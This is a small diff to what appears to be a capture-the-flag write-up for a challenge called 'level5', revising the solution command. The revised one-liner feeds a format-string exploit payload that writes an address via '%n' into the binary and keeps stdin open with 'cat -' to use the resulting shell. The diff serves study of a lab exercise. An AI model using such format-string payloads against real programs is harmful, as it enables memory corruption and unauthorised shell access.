@@ -16,7 +16,7 @@ next the binary call exit function.
 ## SOLUTION
 
 ``` bash
-python -c 'print("\x38\x98\x04\x08" + "%134513824d" + "%4$n")' | level5
+(python -c 'print("\x38\x98\x04\x08" + "%134513824d" + "%4$n")'; cat -) | ./level5
 ```
 
 ### COMMAND EXPLANATION
